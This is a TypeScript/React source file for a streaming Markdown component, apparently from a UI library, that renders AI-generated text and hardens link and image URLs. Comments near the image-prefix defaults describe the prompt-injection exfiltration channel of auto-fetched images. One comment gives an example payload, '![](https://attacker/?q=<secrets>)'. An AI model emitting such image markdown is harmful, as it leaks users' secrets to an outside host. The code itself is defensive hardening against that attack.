/**
 * Markdown — react-markdown over `Prose`, with a streaming-repair pipeline for AI-streamed output
 * (docs/CONTENT-SPEC.md §2/§3/§6). The successor surface to `basalt-ui/agent`'s `StreamingMarkdown`
 * (`density="chat"` reproduces its typography) — see `agent/rules/basalt-content.md` for the
 * migration note; `StreamingMarkdown` is unaffected and keeps shipping.
 *
 * LAZY-LOADED: react-markdown and remark-gfm are OPTIONAL peers, loaded via `React.lazy` + dynamic
 * `import()` (mirrors `agent/streaming-markdown.tsx` and `./highlighter`) — importing
 * `basalt-ui/content` never eagerly resolves them. Without them installed, `Markdown` renders the
 * raw string as plain text.
 *
 * Default element overrides:
 *  - `h1`..`h6` — slugged + hover-anchored (`./heading-components`).
 *  - fenced code (`pre`) — `CodeBlock`, or `MermaidDiagram` for a settled ` ```mermaid ` fence
 *    (`./fence-block`).
 *  - `blockquote` — a GFM alert marker (`[!NOTE]` etc.) renders as `Callout`; otherwise passes
 *    through (`./callout-alert`).
 *  - `a`/`img` — hardened via `allowedLinkPrefixes`/`allowedImagePrefixes`/`defaultOrigin`
 *    (`./url-hardening`); a disallowed URL (including remend's `streamdown:incomplete-link`
 *    sentinel) drops the `href`/`src`, and the component renders an unlinked span / nothing.
 *
 * Streaming mode (`streaming`): `blockSplit` splits `children` into top-level blocks. Every block
 * except the last renders through a memoized renderer (`React.memo`, referentially stable
 * `components`/`urlTransform`) — only the in-flight tail block, repaired via `remend`, re-renders
 * per streamed token. Heading ids: the tail block (and, once it settles, the block it becomes) get
 * their OWN `SlugTracker` rather than sharing one document-wide tracker — a duplicate heading text
 * across two DIFFERENT blocks will not get a deduped `-1` suffix in streaming mode. Streamed chat
 * content doesn't drive a `TableOfContents`, so this is an accepted tradeoff, not a bug.
 *
 * @example
 * import { Markdown } from 'basalt-ui/content'
 *
 * <Markdown>{articleMarkdown}</Markdown>
 * <Markdown density="chat" streaming allowedLinkPrefixes={['https://']}>{streamedText}</Markdown>
 */
import type { CSSProperties, JSX } from 'react'
import { lazy, memo, Suspense, useMemo } from 'react'
import remend from 'remend'
import type {
  Components,
  ExtraProps,
  Options as ReactMarkdownOptions,
  UrlTransform,
} from 'react-markdown'
import { ALERT_CALLOUT_KIND, ALERT_TITLE, detectAlert, stripAlertMarker } from './callout-alert'
import { FenceBlock } from './fence-block'
import { createHeadingComponents } from './heading-components'
import { Callout } from './callout'
import { Prose } from './prose'
import type { ProseDensity } from './prose'
import { SlugTracker } from './slug'
import { blockSplit } from './block-split'
import { createUrlTransform } from './url-hardening'

// ── Public types ───────────────────────────────────────────────────────────────────────────────

export type MarkdownComponents = Components

export type MarkdownProps = {
  /** The markdown string to render. Safe to update on every character during streaming. */
  readonly children: string
  /** Typography density passed through to `Prose`. Default `'article'`. */
  readonly density?: ProseDensity
  /** `Prose`'s measure cap. Defaults to `true` for `'article'` density, `false` for `'chat'`. */
  readonly measure?: boolean
  /** AI-stream mode — block-split + memoize + `remend`-repair the in-flight tail. Default `false`. */
  readonly streaming?: boolean
  /** Per-element overrides merged OVER the defaults (only the keys you supply are replaced). */
  readonly components?: MarkdownComponents
  /** Allowed `href` prefixes. Default `['https://', 'mailto:', '#', '/']`. */
  readonly allowedLinkPrefixes?: readonly string[]
  /** Allowed `img src` prefixes. Default `['https://', '/']`; in `streaming` mode `['/']`
   * (same-origin only) — auto-fetched images are the classic prompt-injection exfiltration
   * channel, so remote origins must be opted in explicitly for model-generated content. */
  readonly allowedImagePrefixes?: readonly string[]
  /** Resolves a relative `href`/`src` to an absolute URL before the allowlist check's result is used. */
  readonly defaultOrigin?: string
  /** Escape hatch — appended after `remark-gfm`. */
  readonly remarkPlugins?: readonly unknown[]
  /** Escape hatch — appended after react-markdown's defaults. */
  readonly rehypePlugins?: readonly unknown[]
  readonly className?: string
  readonly style?: CSSProperties
}

// ── Default element overrides ─────────────────────────────────────────────────────────────────

type LinkProps = JSX.IntrinsicElements['a'] & ExtraProps
type ImgProps = JSX.IntrinsicElements['img'] & ExtraProps
type BlockquoteProps = JSX.IntrinsicElements['blockquote'] & ExtraProps
type PreProps = JSX.IntrinsicElements['pre'] & ExtraProps

function LinkRenderer({ href, children }: LinkProps) {
  if (href === undefined) return <span>{children}</span>
  const external = href.startsWith('http://') || href.startsWith('https://')
  return (
    <a href={href} {...(external && { target: '_blank', rel: 'noreferrer noopener' })}>
      {children}
    </a>
  )
}

function ImageRenderer({ src, alt }: ImgProps) {
  // A blocked src arrives as undefined OR '' depending on how urlTransform dropped it — an
  // `<img src="">` renders the broken-image glyph, so both cases must skip the element entirely.
  if (typeof src !== 'string' || src === '') return <span aria-label={alt} />
  return <img src={src} alt={alt ?? ''} loading="lazy" />
}

function BlockquoteRenderer({ children }: BlockquoteProps) {
  const alert = detectAlert(children)
  if (!alert) return <blockquote>{children}</blockquote>
  return (
    <Callout kind={ALERT_CALLOUT_KIND[alert.kind]} title={ALERT_TITLE[alert.kind]}>
      {stripAlertMarker(children, alert.marker)}
    </Callout>
  )
}

function createPreRenderer(settled: boolean) {
  return function PreRenderer({ node }: PreProps) {
    return <FenceBlock settled={settled} {...(node !== undefined && { node })} />
  }
}

function buildMarkdownComponents(tracker: SlugTracker, settled: boolean): Components {
  return {
    ...createHeadingComponents(tracker),
    pre: createPreRenderer(settled),
    blockquote: BlockquoteRenderer,
    a: LinkRenderer,
    img: ImageRenderer,
  }
}

// ── Lazy-loaded react-markdown + remark-gfm ───────────────────────────────────────────────────

type RemarkPluginList = NonNullable<ReactMarkdownOptions['remarkPlugins']>
type RehypePluginList = NonNullable<ReactMarkdownOptions['rehypePlugins']>

type BridgeProps = {
  readonly text: string
  readonly components: Components
  readonly urlTransform: UrlTransform
  readonly remarkPlugins?: readonly unknown[]
  readonly rehypePlugins?: readonly unknown[]
}

function PlainTextFallback({ text }: { text: string }) {
  return <span style={{ whiteSpace: 'pre-wrap' }}>{text}</span>
}

// The dynamic import chain loads react-markdown + remark-gfm only at render time. If either peer
// is absent the import fails — `.catch` resolves to the plain-text fallback (no unhandled
// rejection, no crash), the same optional-peer contract as `agent/streaming-markdown.tsx`.
const LazyReactMarkdown = lazy(() =>
  Promise.all([import('react-markdown'), import('remark-gfm')])
    .then(([{ default: ReactMarkdown }, { default: remarkGfm }]) => {
      function Bridge({
        text,
        components,
        urlTransform,
        remarkPlugins,
        rehypePlugins,
      }: BridgeProps) {
        const remarkPluginsList: RemarkPluginList = [
          remarkGfm,
          ...((remarkPlugins ?? []) as RemarkPluginList),
        ]
        return (
          <ReactMarkdown
            components={components}
            urlTransform={urlTransform}
            remarkPlugins={remarkPluginsList}
            {...(rehypePlugins !== undefined && {
              rehypePlugins: rehypePlugins as RehypePluginList,
            })}
          >
            {text}
          </ReactMarkdown>
        )
      }
      return { default: Bridge }
    })
    .catch(() => ({ default: ({ text }: BridgeProps) => <PlainTextFallback text={text} /> })),
)

// ── Streaming block rendering ──────────────────────────────────────────────────────────────────

type BlockProps = {
  readonly text: string
  readonly settled: boolean
  readonly components?: MarkdownComponents
  readonly urlTransform: UrlTransform
  readonly remarkPlugins?: readonly unknown[]
  readonly rehypePlugins?: readonly unknown[]
}

// A fresh SlugTracker per block (not shared across blocks) — see the module JSDoc's streaming-mode
// heading-id tradeoff. Recreated only when `text` changes, so a memoized (settled) block's tracker
// is created exactly once.
function BlockRenderer({
  text,
  settled,
  components,
  urlTransform,
  remarkPlugins,
  rehypePlugins,
}: BlockProps) {
  // `text` isn't read in the factory below — it's the reset KEY, forcing a fresh tracker per block.
  // oxlint-disable-next-line react-hooks/exhaustive-deps
  const tracker = useMemo(() => new SlugTracker(), [text])
  const componentsMap = useMemo(
    () => ({ ...buildMarkdownComponents(tracker, settled), ...components }),
    [tracker, settled, components],
  )
  return (
    <LazyReactMarkdown
      text={text}
      components={componentsMap}
      urlTransform={urlTransform}
      {...(remarkPlugins !== undefined && { remarkPlugins })}
      {...(rehypePlugins !== undefined && { rehypePlugins })}
    />
  )
}

// Referential stability of `components`/`urlTransform` (both memoized by the caller) is what makes
// this memo skip re-rendering an unchanged settled block — see the module JSDoc.
const MemoizedBlock = memo(BlockRenderer)

function StreamingTailBlock(props: Omit<BlockProps, 'settled'>) {
  const repaired = useMemo(() => remend(props.text), [props.text])
  return <BlockRenderer {...props} text={repaired} settled={false} />
}

type BodyProps = {
  readonly text: string
  readonly components?: MarkdownComponents
  readonly urlTransform: UrlTransform
  readonly remarkPlugins?: readonly unknown[]
  readonly rehypePlugins?: readonly unknown[]
}

function SettledBody({ text, components, urlTransform, remarkPlugins, rehypePlugins }: BodyProps) {
  return (
    <Suspense fallback={<PlainTextFallback text={text} />}>
      <BlockRenderer
        text={text}
        settled
        urlTransform={urlTransform}
        {...(components !== undefined && { components })}
        {...(remarkPlugins !== undefined && { remarkPlugins })}
        {...(rehypePlugins !== undefined && { rehypePlugins })}
      />
    </Suspense>
  )
}

function StreamingBody({
  text,
  components,
  urlTransform,
  remarkPlugins,
  rehypePlugins,
}: BodyProps) {
  const blocks = useMemo(() => blockSplit(text), [text])
  const lastIndex = blocks.length - 1

  return (
    <Suspense fallback={<PlainTextFallback text={text} />}>
      {blocks.map((block, index) => {
        const shared = {
          text: block,
          urlTransform,
          ...(components !== undefined && { components }),
          ...(remarkPlugins !== undefined && { remarkPlugins }),
          ...(rehypePlugins !== undefined && { rehypePlugins }),
        }
        // Block positions are stable during a stream (only the tail is ever replaced in place),
        // so the array index is a safe, stable `key` here.
        return index === lastIndex ? (
          <StreamingTailBlock key={index} {...shared} />
        ) : (
          <MemoizedBlock key={index} {...shared} settled />
        )
      })}
    </Suspense>
  )
}

// ── Markdown ───────────────────────────────────────────────────────────────────────────────────

const DEFAULT_LINK_PREFIXES: readonly string[] = ['https://', 'mailto:', '#', '/']
const DEFAULT_IMAGE_PREFIXES: readonly string[] = ['https://', '/']
/* Streamed (model-generated) markdown: images auto-fetch, so an open `https://` default is a
 * prompt-injection exfiltration channel (`![](https://attacker/?q=<secrets>)`). Same-origin only
 * unless the consumer opts specific origins in. Links stay clickable — navigation is user-initiated. */
const STREAMING_IMAGE_PREFIXES: readonly string[] = ['/']

export function Markdown({
  children,
  density = 'article',
  measure,
  streaming = false,
  components,
  allowedLinkPrefixes = DEFAULT_LINK_PREFIXES,
  allowedImagePrefixes = streaming ? STREAMING_IMAGE_PREFIXES : DEFAULT_IMAGE_PREFIXES,
  defaultOrigin,
  remarkPlugins,
  rehypePlugins,
  className,
  style,
}: MarkdownProps) {
  const resolvedMeasure = measure ?? density === 'article'

  const urlTransform = useMemo<UrlTransform>(
    () =>
      createUrlTransform({
        allowedLinkPrefixes,
        allowedImagePrefixes,
        ...(defaultOrigin !== undefined && { defaultOrigin }),
      }),
    [allowedLinkPrefixes, allowedImagePrefixes, defaultOrigin],
  )

  const bodyProps: BodyProps = {
    text: children,
    urlTransform,
    ...(components !== undefined && { components }),
    ...(remarkPlugins !== undefined && { remarkPlugins }),
    ...(rehypePlugins !== undefined && { rehypePlugins }),
  }

  return (
    <Prose
      density={density}
      measure={resolvedMeasure}
      {...(className !== undefined && { className })}
      {...(style !== undefined && { style })}
    >
      {streaming ? <StreamingBody {...bodyProps} /> : <SettledBody {...bodyProps} />}
    </Prose>
  )
}
